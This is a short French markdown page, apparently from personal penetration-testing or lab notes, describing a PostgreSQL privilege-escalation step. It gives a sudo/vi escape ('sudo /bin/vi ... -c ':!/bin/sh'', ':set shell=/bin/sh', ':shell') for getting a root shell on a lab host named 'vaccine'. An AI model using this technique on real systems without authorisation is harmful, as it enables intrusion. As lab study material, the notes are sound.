<sub>[Procédure serveur](server_procedure.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Cryptage](cryptage.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Outils](tools.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Sites utiles](useful_website.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Lexique](lexique.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Index](index.md)</sub>
<sub>[Retour](server_procedure.md)</sub>
#Postgre SQL

**Présentation :** Outil de gestion de base de données

**Procédure :**
- Tenter [SUID](suid.md) pour ouvrir un terminal en tant que root
  - si SUID possible avec vim chercher le fichier *pg_hba.conf* : *sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf -c ':!/bin/sh' /dev/null*
    - Si ok alors entrer :
        <code>:set shell=/bin/sh
        :shell</code>
    - Sinon : *Sorry, user postgres is not allowed to execute '/bin/vi /etc/postgresql/11/main/pg_hba.conf -c :!/bin/sh' as root on vaccine.*

